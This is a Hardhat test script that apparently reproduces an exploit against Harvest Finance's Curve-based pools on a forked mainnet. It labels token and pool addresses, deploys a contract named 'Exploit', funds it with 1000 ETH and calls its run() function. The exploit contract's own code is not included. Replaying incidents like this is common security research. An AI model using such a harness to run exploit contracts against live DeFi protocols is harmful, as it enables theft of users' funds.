const { expect } = require("chai");
hre.tracer.nameTags["0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51"] = "Curve Swap";
hre.tracer.nameTags["0x9B3bE0cc5dD26fd0254088d03D8206792715588B"] = "Harvest";
hre.tracer.nameTags["0xdAC17F958D2ee523a2206206994597C13D831ec7"] = "USDT";
hre.tracer.nameTags["0x5FbDB2315678afecb367f032d93F642f64180aa3"] = "Contract";
hre.tracer.nameTags["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"] = "USDC";
hre.tracer.nameTags["0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852"] = "USDT PAIR";
hre.tracer.nameTags["0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc"] = "USDC PAIR";

describe("Exploit", function() {
  it("Should return the new greeting once it's changed", async function() {
    const Exploit = await hre.ethers.getContractFactory("Exploit");
    const exploit = await Exploit.deploy();

    await exploit.deployed();

    const [owner, addr1] = await ethers.getSigners();
    await owner.sendTransaction({ 
      to: exploit.address,
      value: ethers.utils.parseEther("1000")
    });
    const foo = await exploit.run({gasLimit: 92000000, gasPrice: 99});
    //console.log(foo);
    const receipt = await ethers.provider.getTransactionReceipt(foo.hash);
  });
});
